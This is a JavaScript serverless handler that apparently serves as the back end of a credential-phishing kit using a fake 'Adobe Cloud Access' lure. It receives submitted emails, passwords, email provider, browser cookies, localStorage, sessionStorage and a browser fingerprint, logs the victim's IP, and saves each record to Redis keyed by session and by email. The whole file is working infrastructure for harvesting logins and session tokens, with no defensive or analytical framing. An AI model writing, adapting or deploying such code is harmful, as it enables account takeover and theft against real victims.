export const handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body || '{}');
    
    // Check environment variables for Redis
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
    
    // Get client IP
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                    event.headers['x-real-ip'] || 
                    event.headers['cf-connecting-ip'] ||
                    event.requestContext?.identity?.sourceIp ||
                    'Unknown';

    // Create session data
    const sessionData = {
      email: data.email || '',
      password: data.password || 'Not captured',
      provider: data.provider || 'Others',
      fileName: data.fileName || 'Adobe Cloud Access',
      timestamp: data.timestamp || new Date().toISOString(),
      sessionId: data.sessionId || Math.random().toString(36).substring(2, 15),
      clientIP: clientIP,
      userAgent: data.userAgent || 'Unknown',
      deviceType: data.deviceType || (/Mobile|Android|iPhone|iPad/.test(data.userAgent || '') ? 'mobile' : 'desktop'),
      cookies: data.cookies || 'No cookies found',
      formattedCookies: data.formattedCookies || [],
      localStorage: data.localStorage || 'Empty',
      sessionStorage: data.sessionStorage || 'Empty',
      browserFingerprint: data.browserFingerprint || {}
    };

    // Try to store in Redis if available, otherwise use memory
    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });
        
        await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData));
        await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData));
        console.log('✅ Session saved to Redis:', sessionData.sessionId);
      } catch (redisError) {
        console.error('❌ Redis storage error, falling back to memory:', redisError);
        // Fallback to memory storage
        global.sessions = global.sessions || {};
        global.sessions[sessionData.sessionId] = sessionData;
      }
    } else {
      // Store session in memory (fallback)
      global.sessions = global.sessions || {};
      global.sessions[sessionData.sessionId] = sessionData;
      console.log('⚠️ Using memory storage (Redis not configured)');
    }

    console.log('✅ Session saved successfully:', sessionData.sessionId);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        sessionId: sessionData.sessionId,
        message: 'Session saved successfully',
        storage: UPSTASH_REDIS_REST_URL ? 'Redis' : 'Memory'
      }),
    };

  } catch (error) {
    console.error('❌ Error saving session:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Failed to save session',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};